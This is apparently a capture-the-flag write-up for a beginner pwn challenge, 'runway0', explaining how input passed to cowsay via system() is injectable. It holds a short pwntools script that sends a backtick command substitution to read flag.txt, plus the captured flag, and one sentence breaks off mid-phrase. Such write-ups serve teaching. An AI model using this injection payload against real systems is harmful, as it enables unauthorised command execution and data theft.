https://ctftime.org/event/2449

# runway0 (pwn)

If you've never done a CTF before, this runway should help!

Hint: MacOS users (on M series) will need a x86 Linux VM. Tutorial is here: pwnoh.io/utm

nc challs.pwnoh.io 13400

## Analysis

We can see that whatever we supply is inserted between two `"`s as an argument to `cowsay` and then passed to system.

This should allow us to easily run a command during the evaluation of `cowsay`'s arguments using backticks or `

## Solution

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
p = remote("challs.pwnoh.io", 13400)

p.sendline(b"`cat flag.txt`")

p.interactive() # bctf{0v3rfl0w_th3_M00m0ry_2d310e3de286658e}
```

## Flag
`bctf{0v3rfl0w_th3_M00m0ry_2d310e3de286658e}`

smiley 2024/09/29
